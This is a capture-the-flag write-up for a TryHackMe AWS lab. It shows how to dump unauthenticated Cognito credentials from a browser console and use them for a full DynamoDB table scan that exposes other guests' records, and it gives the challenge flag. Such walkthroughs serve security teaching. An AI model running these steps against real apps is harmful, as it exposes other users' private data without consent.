# Complimentary Challenge - TryHackMe

## Today's Itinerary

1. Track down the AWS mechanism issuing you credentials behind the scenes.
2. Use those credentials to dump more than your own record from the app's DynamoDB table.
3. Retrieve the flag from another guest's data.

The challenge provides the following website:

```
http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/
```

![Homepage](https://github.com/user-attachments/assets/3941266a-b195-4018-b1e8-fde493ef6bdb)

---

# Step 1 - Find how the AWS credentials work

Looking at the first objective, I thought the first thing to understand was how the application gets AWS credentials.

Using the browser's **Inspect** feature, I found the following code inside `app.js`:

```javascript
function guestId() {
  let id = localStorage.getItem("byteLotusGuestId");
  if (!id) {
    // First visit: hand out a throwaway guest id, same as checking in.
    id = "guest-" + Math.random().toString(36).slice(2, 10);
    localStorage.setItem("byteLotusGuestId", id);
  }
  return id;
}
```

The `guestId()` function stores a random guest identifier inside the browser's **Local Storage**.

A little further down in the same file I found this:

```javascript
AWS.config.region = AWS_REGION;

AWS.config.credentials = new AWS.CognitoIdentityCredentials({
  IdentityPoolId: IDENTITY_POOL_ID,
});
```

The interesting part here is `AWS.CognitoIdentityCredentials`.

I wasn't familiar with it, so I looked it up.

`CognitoIdentityCredentials` is an AWS SDK class that retrieves temporary AWS credentials through **Amazon Cognito Identity Pools**. Instead of storing permanent AWS keys in the application, Cognito provides temporary credentials (`accessKeyId`, `secretAccessKey`, and `sessionToken`) that the application can use to access AWS services.

Internally, Cognito calls APIs like `GetId` and `GetCredentialsForIdentity` to obtain those temporary credentials.

---

# Step 2 - Verify the credentials

To see whether the application already had AWS credentials, I opened the browser's **Developer Console** and ran:

```javascript
console.log(AWS.config.credentials);
```

The output showed that the application was already using Cognito credentials.

To retrieve the current temporary credentials, I executed:

```javascript
AWS.config.credentials.get(() => {
  console.log({
    accessKeyId: AWS.config.credentials.accessKeyId,
    secretAccessKey: AWS.config.credentials.secretAccessKey,
    sessionToken: AWS.config.credentials.sessionToken
  });
});
```

The console returned an `accessKeyId`, `secretAccessKey`, and `sessionToken`, confirming that even an unauthenticated user receives valid AWS credentials.

---

# Step 3 - Access the DynamoDB table

Now the next step was to see what those credentials were allowed to access.

Looking at `app.js`, I found that the application normally retrieves data using `getItem()`.

```javascript
dynamodb.getItem(
  {
    TableName: TABLE_NAME,
    Key: {
      guest_id: {
        S: guestId()
      }
    }
  },
  function (err, data) {
    if (err) {
      console.error("Could not load dashboard:", err);
      return;
    }

    renderDashboard(data.Item);
  }
);
```

This means the application is supposed to fetch only the current guest's record.

I created a DynamoDB client in the browser console:

```javascript
const db = new AWS.DynamoDB({
  region: "us-east-1"
});
```

Then I tried scanning the entire table:

```javascript
db.scan(
  {
    TableName: "complimentary-GuestWellnessProfiles"
  },
  (err, data) => {
    console.log(err);
    console.log(data);
  }
);
```

The output was:

```text
Object {
    Items: (5),
    Count: 5,
    ScannedCount: 5
}
```

This told me that the guest IAM role had permission to perform a full table scan instead of only reading its own record.

![Scan Result](https://github.com/user-attachments/assets/0371176a-a4ac-4adc-8df8-ca66b480aad2)

---

# Step 4 - Retrieve the flag

To print all the records stored in the table, I used:

```javascript
db.scan(
  {
    TableName: "complimentary-GuestWellnessProfiles"
  },
  (err, data) => {
    console.log(JSON.stringify(data.Items, null, 2));
  }
);
```

This printed all five guest records.

While going through the output, I found one record where the `notes` field contained the flag.

![All Records](https://github.com/user-attachments/assets/623f987a-d105-413e-b672-adf76cbd5a4d)

The flag was embedded inside the `notes` field.

![Flag](https://github.com/user-attachments/assets/b671b6bb-4209-4328-8724-5639f00c631c)

---

## Flag

```text
THM{fr33_app_fr33_d4t4!}
```



